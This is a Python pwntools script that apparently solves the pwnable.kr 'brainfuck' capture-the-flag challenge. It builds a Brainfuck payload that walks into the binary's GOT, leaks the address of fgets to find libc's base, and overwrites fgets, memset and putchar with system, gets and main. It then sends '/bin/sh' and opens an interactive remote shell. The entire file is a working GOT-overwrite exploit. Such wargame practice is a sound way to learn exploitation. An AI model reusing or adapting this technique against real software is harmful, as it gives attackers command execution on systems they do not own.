from pwn import *

class BrainfuckExploit(object):

    FGETS_GOT_ADDRESS = 0x804A010
    PUTCHAR_GOT_ADDRESS = 0x804A030
    MEMSET_GOT_ADDRESS = 0x804A02C
    MAIN_ADDRESS = 0x8048671
    DATA_POINTER_INITIAL_ADDRESS = 0x804A0A0
    LIBC_ELF = ELF("bf_libc.so")

    def __init__(self):
        self.current_data_pointer = self.DATA_POINTER_INITIAL_ADDRESS
        self.exploit_payload = ""
        self.shell = remote('pwnable.kr', 9001)

    def traverse_to_requested_address(self, requested_address):
        offset = requested_address - self.current_data_pointer
        self.current_data_pointer = requested_address
        self.exploit_payload += ">" * offset if offset > 0 else "<" * (-offset)

    def read_address_from_memory(self):
        self.exploit_payload += ".>" * 4 + "<" * 4

    def write_address_to_memory(self):
        self.exploit_payload += ",>" * 4 + "<" * 4

    def restart_brainfuck_main(self):
        self.exploit_payload += "."

    def craft_exploit_payload(self):
        self.traverse_to_requested_address(self.FGETS_GOT_ADDRESS)
        self.read_address_from_memory()
        self.write_address_to_memory()
        self.traverse_to_requested_address(self.MEMSET_GOT_ADDRESS)
        self.write_address_to_memory()
        self.traverse_to_requested_address(self.PUTCHAR_GOT_ADDRESS)
        self.write_address_to_memory()
        self.restart_brainfuck_main()

    def overwrite_got(self):
        fgets_address = u32(self.shell.recv() + self.shell.recv())
        libc_base = fgets_address - self.LIBC_ELF.symbols["fgets"]
        self.shell.send(p32(libc_base + self.LIBC_ELF.symbols["system"]))
        self.shell.send(p32(libc_base + self.LIBC_ELF.symbols["gets"]))
        self.shell.send(p32(self.MAIN_ADDRESS))

    def run(self):
        print(self.shell.recv())
        print(self.shell.recv())

        self.craft_exploit_payload()
        self.shell.sendline(self.exploit_payload)

        self.overwrite_got()
        self.shell.send("/bin/sh\n")
        self.shell.interactive()


if __name__ == '__main__':
    BrainfuckExploit().run()
